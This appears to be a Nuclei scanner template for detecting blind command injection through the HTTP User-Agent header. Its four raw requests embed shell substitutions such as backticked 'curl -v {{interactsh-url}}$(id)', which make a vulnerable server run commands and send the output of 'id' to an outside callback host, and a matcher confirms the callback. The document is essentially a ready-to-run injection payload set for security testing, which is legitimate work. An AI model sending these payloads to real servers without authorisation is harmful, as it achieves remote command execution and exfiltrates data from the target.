http:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
    - http
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    User-Agent: `curl -v {{interactsh-url}}$(id)`

    '
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    User-Agent: `curl -v {{interactsh-url}}.$(id)`

    '
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    User-Agent: `curl -v $(id){{interactsh-url}}`

    '
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    User-Agent: `curl -v $(id).{{interactsh-url}}$(id)`

    '
id: blind-rce-user-agent
info:
  author: dk4trin
  description: Command Injection Blind
  name: dk4trin Blind Command Injection
  severity: critical
  tags: rce,generic
